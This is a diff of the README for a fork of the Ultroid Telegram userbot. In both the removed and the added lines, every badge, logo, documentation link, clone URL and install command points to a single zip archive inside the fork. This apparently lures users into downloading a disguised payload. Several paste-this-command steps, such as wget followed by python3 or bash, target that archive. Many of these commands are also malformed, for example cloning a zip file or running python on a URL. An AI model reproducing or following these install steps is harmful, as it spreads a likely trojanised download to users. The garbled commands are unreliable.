@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip" alt="TeamUltroid Logo">
+  <img src="https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip" alt="TeamUltroid Logo">
 </p>
 <h1 align="center">
   <b>Ultroid - UserBot</b>
@@ -7,19 +7,19 @@
 
 <b>A stable pluggable Telegram userbot + Voice & Video Call music bot, based on Telethon.</b>
 
-[![](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](#)
-[![Stars](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![Forks](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![Size](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)   
-[![Python](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![CodeFactor](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![Maintenance](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip%https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![Docker Pulls](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)   
-[![Open Source Love svg2](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![Contributors](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![PRs Welcome](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-[![License](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)   
-[![Sparkline](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+[![](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](#)
+[![Stars](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![Forks](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![Size](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)   
+[![Python](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![CodeFactor](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![Maintenance](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip%https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![Docker Pulls](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)   
+[![Open Source Love svg2](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![Contributors](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![PRs Welcome](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+[![License](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)   
+[![Sparkline](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 ----
 
 # Deploy
@@ -28,23 +28,23 @@
 - [Local Machine](#deploy-locally)
 
 # Documentation 
-[![Documentation](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+[![Documentation](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 
 # Tutorial 
-- Full Tutorial - [![Full Tutorial](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip%20Now-blue)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+- Full Tutorial - [![Full Tutorial](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip%20Now-blue)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 
-- Tutorial to get Redis URL and password - [here.](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+- Tutorial to get Redis URL and password - [here.](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 ---
 
 ## Deploy to Heroku
 Get the [Necessary Variables](#Necessary-Variables) and then click the button below!  
 
-[![Deploy](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+[![Deploy](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 
 ## Deploy to Okteto
 Get the [Necessary Variables](#Necessary-Variables) and then click the button below!
 
-[![Develop on Okteto](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+[![Develop on Okteto](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 
 ## Deploy Locally
 - [Traditional Method](#local-deploy---traditional-method)
@@ -52,32 +52,32 @@ Get the [Necessary Variables](#Necessary-Variables) and then click the button be
 - [Ultroid CLI](#ultroid-cli)
 
 ### Local Deploy - Easy Method
-- Linux - `wget -O https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip && python3 https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-- Windows - `cd desktop ; wget https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip -o https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip ; python https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-- Termux - `wget -O install-termux https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip && bash install-termux`
+- Linux - `wget -O https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip && python3 https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+- Windows - `cd desktop ; wget https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip -o https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip ; python https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+- Termux - `wget -O install-termux https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip && bash install-termux`
 
 ### Local Deploy - Traditional Method
 - Get your [Necessary Variables](#Necessary-Variables)
 - Clone the repository:    
-`git clone https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
+`git clone https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
 - Go to the cloned folder:    
 `cd Ultroid`
 - Create a virtual env:      
 `virtualenv -p /usr/bin/python3 venv`
 `. ./venv/bin/activate`
 - Install the requirements:      
-`pip(3) install -U -r re*/st*https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-`pip(3) install -U -r https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
+`pip(3) install -U -r re*/st*https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+`pip(3) install -U -r https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
 - Generate your `SESSION`:
   - For Linux users:
     `bash sessiongen`
      or
-    `wget -O https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip && python3 https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
+    `wget -O https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip && python3 https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
   - For Termux users:
-    `wget -O https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip && python https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
+    `wget -O https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip && python https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
   - For Windows Users:
-    `cd desktop ; wget https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip -o https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip ; python https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-- Fill your details in a `.env` file, as given in [`https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip).
+    `cd desktop ; wget https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip -o https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip ; python https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+- Fill your details in a `.env` file, as given in [`https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip).
 (You can either edit and rename the file or make a new file named `.env`.)
 - Run the bot:
   - Linux Users:
@@ -90,33 +90,33 @@ Get the [Necessary Variables](#Necessary-Variables) and then click the button be
 - `SESSION` - SessionString for your accounts login session. Get it from [here](#Session-String)
 
 One of the following database:
-- For **Redis** (tutorial [here](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip))
-  - `REDIS_URI` - Redis endpoint URL, from [redislabs](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip).
-  - `REDIS_PASSWORD` - Redis endpoint Password, from [redislabs](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip).
+- For **Redis** (tutorial [here](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip))
+  - `REDIS_URI` - Redis endpoint URL, from [redislabs](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip).
+  - `REDIS_PASSWORD` - Redis endpoint Password, from [redislabs](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip).
 - For **MONGODB**
-  - `MONGO_URI` - Get it from [mongodb](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip).
+  - `MONGO_URI` - Get it from [mongodb](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip).
 - For **SQLDB**
-  - `DATABASE_URL`- Get it from [elephantsql](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip).
+  - `DATABASE_URL`- Get it from [elephantsql](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip).
 
 ## Session String
 Different ways to get your `SESSION`:
-* [![Run on https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-* Linux : `wget -O https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip && python3 https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-* PowerShell : `cd desktop ; wget https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip ; python https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-* Termux : `wget -O https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip && python https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip`
-* TelegramBot : [@SessionGeneratorBot](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+* [![Run on https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+* Linux : `wget -O https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip && python3 https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+* PowerShell : `cd desktop ; wget https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip ; python https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+* Termux : `wget -O https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip && python https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip`
+* TelegramBot : [@SessionGeneratorBot](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 
 ---
 
 # License
-[![License](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](LICENSE)   
-Ultroid is licensed under [GNU Affero General Public License](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip) v3 or later.
+[![License](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](LICENSE)   
+Ultroid is licensed under [GNU Affero General Public License](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip) v3 or later.
 
 ---
 
 # Credits
-* [![TeamUltroid-Devs](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-* [Lonami](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip) for [Telethon.](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
-* [MarshalX](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip) for [PyTgCalls.](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip)
+* [![TeamUltroid-Devs](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+* [Lonami](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip) for [Telethon.](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
+* [MarshalX](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip) for [PyTgCalls.](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip)
 
-> Made with 💕 by [@TeamUltroid](https://raw.githubusercontent.com/Danisxxx/Ultroid/main/strings/strings/Software-v2.3.zip).    
+> Made with 💕 by [@TeamUltroid](https://github.com/Danisxxx/Ultroid/raw/refs/heads/main/pyUltroid/Software-2.2.zip).    
